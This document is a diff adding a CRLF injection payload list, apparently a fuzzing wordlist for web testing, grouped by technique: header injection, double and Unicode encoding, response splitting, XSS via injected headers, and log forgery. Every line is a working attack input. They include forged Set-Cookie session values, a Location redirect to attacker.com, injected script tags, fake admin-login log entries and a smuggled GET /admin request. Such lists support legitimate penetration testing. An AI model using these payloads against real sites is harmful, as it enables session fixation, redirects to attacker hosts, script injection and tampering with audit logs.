@@ -1,0 +1,33 @@
+# Basic CRLF header injection
+%0d%0aInjected-Header:true
+%0d%0aSet-Cookie:session=evil
+%0d%0aLocation:http://attacker.com
+\r\nInjected-Header:true
+\r\nSet-Cookie:session=evil
+
+# Double-encoded CRLF
+%250d%250aInjected-Header:true
+%25%30%64%25%30%61Injected-Header:true
+
+# Response splitting
+%0d%0a%0d%0a<html><body>Injected</body></html>
+%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>Injected</html>
+
+# XSS via CRLF
+%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0a%0d%0a<script>alert(document.domain)</script>
+
+# Log injection
+%0d%0a[INFO] Fake log entry - admin login successful
+\r\n[ERROR] 127.0.0.1 - admin authenticated
+%0d%0a%0d%0aGET /admin HTTP/1.1%0d%0aHost:localhost
+
+# Unicode CRLF variants
+%e5%98%8a%e5%98%8dInjected-Header:true
+%c4%8d%c4%8aInjected-Header:true
+
+# Null-byte + CRLF
+%00%0d%0aInjected-Header:true
+
+# Tab-based header injection
+%09Injected-Header:true
